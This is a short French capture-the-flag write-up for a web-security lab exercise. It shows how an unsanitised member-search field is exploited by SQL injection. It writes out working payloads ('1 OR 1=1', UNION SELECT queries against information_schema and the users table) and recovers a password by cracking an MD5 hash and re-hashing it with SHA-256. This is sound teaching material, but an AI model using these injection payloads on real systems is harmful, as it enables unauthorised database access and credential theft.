Dans la page des Membre, on peut chercher les membres presents en db avec leur id.
L'astuce ici est que l'input n'est pas sanitized et n'est donc pas proteger des injections sql.
Pour acceder a l'ensemble des membres dans la db on peut entrer par exemple 1 OR 1=1
Autrement dis toutes les recherches retourneront true et tous les membres seront remvoyes.
Pour ajouter une requete on peut utiliser le mot cle UNION,
on s'en sert ici pour chercher les noms des champs dans la db :
1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns

Ce qui donne les informations de toutes les tables dans la db.
On peut ainsi voir qu'un user a ce genre de champs:

user_id, first_name, last_name, town, country, planet, commentaire, countersign, ....

Apres quelques recherches les champs qui nous interressent sont commentaire et countersign :

1 OR 1=1 UNION SELECT Commentaire, countersign from users 

On obtiens les users avec seulement ces deux champs, on remarque ceci sur le dernier user:

ID: 1 OR 1=1 UNION SELECT Commentaire, countersign from users 
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

Depuis le md5 on obtiens "FortyTwo".
fortytwo en sh256 = 10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5
On obtiens le flag !
